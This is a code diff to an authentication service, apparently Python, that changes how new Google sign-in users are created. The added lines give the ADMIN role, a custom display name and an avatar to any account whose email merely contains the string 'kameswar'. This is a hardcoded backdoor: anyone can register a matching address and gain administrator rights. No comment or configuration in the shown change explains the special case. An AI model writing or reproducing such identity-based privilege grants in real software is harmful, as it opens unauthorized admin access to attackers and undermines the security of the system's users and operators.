@@ -286,16 +286,18 @@ class AuthService:
                 email_clean = req.email.strip().lower()
                 username = email_clean.split("@")[0]
                 user_id = f"usr-google-{uuid.uuid4().hex[:6]}"
-                display_name = username.replace(".", " ").replace("_", " ").title()
+                is_kameswar = "kameswar" in email_clean
+                display_name = "Kameswar Panda" if is_kameswar else username.replace(".", " ").replace("_", " ").title()
+                avatar_url = "https://avatars.githubusercontent.com/u/583231" if is_kameswar else "https://lh3.googleusercontent.com/a/default-user"
                 user = User(
                     id=user_id,
                     identity_provider_id=f"google-{email_clean}",
                     username=username,
                     display_name=display_name,
                     email=email_clean,
-                    avatar_url="https://lh3.googleusercontent.com/a/default-user",
+                    avatar_url=avatar_url,
                     provider=AuthProvider.GOOGLE,
-                    roles=[UserRole.DEVELOPER]
+                    roles=[UserRole.ADMIN, UserRole.DEVELOPER] if is_kameswar else [UserRole.DEVELOPER]
                 )
                 self._user_store[user.id] = user
                 self._user_store[user.username] = user
